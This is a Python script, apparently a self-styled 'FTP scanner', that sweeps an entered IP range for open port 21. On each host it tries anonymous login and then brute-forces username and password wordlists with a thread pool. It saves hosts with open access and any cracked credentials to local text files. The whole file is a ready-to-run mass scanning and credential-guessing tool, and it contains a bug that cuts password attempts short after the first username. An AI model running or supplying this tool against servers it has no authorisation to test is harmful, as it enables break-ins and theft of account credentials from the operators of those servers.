#!/usr/bin/env python$
# coding=utf-8

import socket
import ftplib
import sys
from concurrent.futures import ThreadPoolExecutor
import os


def ip2num(ip):
    #ip to num
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]

def num2ip(num):
    #num to ip
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24,
                            (num & 0x00ff0000) >> 16,
                            (num & 0x0000ff00) >> 8,
                            num & 0x000000ff)

def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]

def login(ip,user,passwd):
    try:
        ftp = ftplib.FTP(ip)
        ftp.login(user,passwd)
    except ftplib.all_errors:
        pass
    else:
        print("Login success!--------------> {}".format(ip))
        with open(os.path.abspath('.')+'/ftpaccount.txt','a+') as f:
            f.write(ip+'#'+user+'#'+passwd+'\n')
        ftp.quit()

def loginanonymously(ip):
    try:
        ftp = ftplib.FTP(ip)
        ftp.login()
    except ftplib.all_errors:
        print("Login as Anonymously False! {}".format(ip))
        try:
            with ThreadPoolExecutor(3) as Executor:
                with open(sys.argv[1],'r') as userfile:
                    with open(sys.argv[2],'r') as passwdfile:
                        for user in userfile:
                            user = user.strip('\n')
                            for passwd in passwdfile:
                                passwd = passwd.strip('\n')
                                try:
                                    Executor.submit(login,ip,user,passwd)
                                except Exception as e:
                                    print(e)
                                    pass
        except ftplib.all_errors:
            pass
    else:
        print("Login success!--------------->  {}".format(ip))
        with open(os.path.abspath('.')+'/ftpanonymously.txt','a+') as f:
            f.write(ip+'\n')
        ftp.quit()

def conn(ip):
    try:
        serv = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        check = serv.connect_ex((ip,21))
        if check == 0:
            loginanonymously(ip)
            with open(os.path.abspath('.')+'/open21.txt','a+') as f:
                f.write(ip+'\r\n')
        else:
            print("[+]{} No Found FTP Port".format(ip))
        serv.close()
    except Exception as e:
        print(e)
        pass

def scanner(iplist,ThreadNum):
    socket.setdefaulttimeout(2.5)
    with ThreadPoolExecutor(ThreadNum) as Executor:
        for ip in iplist:
            try:
                Executor.submit(conn,ip)
            except Exception as e:
                print(e)
                pass

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("[+]Please Using :")
        print("[+]scanner.py user.txt passwd.txt")
        sys.exit(0)
    print("[+]---------Welcome to FTP scanner--------")
    print("[+]----------------By LiT0----------------")
    start_ip = input("[+]Start IPaddr: ")
    end_ip = input("[+]End ipaddr: ")
    ThreadNum = input("Thread Number: ")
    iplist = ip_range(start_ip,end_ip)
    scanner(iplist,int(ThreadNum))
